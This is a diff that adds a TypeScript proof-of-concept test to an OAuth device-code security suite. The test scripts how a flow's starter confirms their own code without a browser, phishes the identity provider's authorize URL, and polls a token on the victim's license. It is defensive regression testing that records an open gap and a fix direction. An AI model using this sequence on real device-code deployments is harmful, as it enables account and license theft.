@@ -766,6 +766,83 @@ describe("R8-02 device-code flow weaknesses", () => {
     expect(real.token?.startsWith("pkeyt_")).toBe(true);
   });
 
+  // OPEN — R1-07 (Fixed-partial) rooted in R8-03. This PoC asserts the GAP, not a fix: the
+  // user-code page does not stop the flow's STARTER, who can confirm their own flow with no
+  // browser at all and phish the resulting IdP authorize URL. Neither the Fetch Metadata /
+  // Origin check nor the single-use csrf token is a control here — the starter mints the token.
+  it("OPEN (R1-07 / R8-03): the starter confirms its own flow from curl, phishes the authorize URL, and polls a token on the victim's license", async () => {
+    const started = await handleAuthDeviceStart(
+      req(`${ORIGIN}/djdl/identity/auth/device/start`, {
+        method: "POST",
+        body: JSON.stringify({ deviceId: "attacker-device" }),
+      }),
+      ctx.env,
+      ctx.db,
+      ctx.product,
+    );
+    const { deviceCode, userCode } = (await started.json()) as {
+      deviceCode: string;
+      userCode: string;
+    };
+    const ENTRY = `${ORIGIN}/djdl/identity/auth/device`;
+    // 1. The attacker reads the csrf token off the page for their OWN code…
+    const page = await handleAuthDeviceEntry(
+      req(`${ENTRY}?user_code=${userCode}`, {
+        headers: { "cf-connecting-ip": "198.51.100.66" },
+      }),
+      ctx.env,
+      ctx.product,
+    );
+    const csrf = (await page.text()).match(/name="csrf" value="([^"]+)"/)![1]!;
+    // 2. …and POSTs it with no Origin and no Sec-Fetch-Site, as curl does. It confirms.
+    const confirmed = await handleAuthDeviceEntry(
+      req(ENTRY, {
+        method: "POST",
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
+          "cf-connecting-ip": "198.51.100.66",
+        },
+        body: new URLSearchParams({ user_code: userCode, csrf }).toString(),
+      }),
+      ctx.env,
+      ctx.product,
+    );
+    expect(confirmed.status).toBe(303);
+    // 3. The attacker now holds the IdP authorize URL (state, nonce, PKCE challenge).
+    const authorize = new URL(confirmed.headers.get("location")!);
+    expect(authorize.origin).toBe("https://id.example");
+    // 4. A victim who signs in at that URL (or is silently SSO'd) never sees the Polaris page.
+    installFetchMock(
+      await signIdToken(ctx, {
+        sub: "victim-sub",
+        email: "victim@corp.com",
+        email_verified: true,
+        groups: ["family"],
+        nonce: authorize.searchParams.get("nonce")!,
+      }),
+    );
+    expect(
+      (await callback(ctx, authorize.searchParams.get("state")!)).status,
+    ).toBe(200);
+    // 5. GAP: the attacker's device, with its own device code, receives a token on the
+    //    victim's license. Fix direction (unowned): bind a viaDeviceCode flow's callback to the
+    //    browser that confirmed it (a __Host- SameSite=Lax cookie set on the confirmation 303).
+    const stolen = (await (
+      await handleAuthDevicePoll(
+        req(`${ORIGIN}/djdl/identity/auth/device/poll`, {
+          method: "POST",
+          body: JSON.stringify({ deviceCode, deviceId: "attacker-device" }),
+        }),
+        ctx.env,
+        ctx.db,
+        ctx.product,
+        NOW,
+      )
+    ).json()) as { status: string; token?: string };
+    expect(stolen.status).toBe("ready");
+    expect(stolen.token?.startsWith("pkeyt_")).toBe(true);
+  });
+
   // R8-02 — `interval` is enforced server-side and the poll surface is rate limited.
   it("ATTACK: userCode is a case-folded PREFIX of the device code, and `interval`/`slow_down` are advertised but never enforced", async () => {
     const start = await handleAuthDeviceStart(
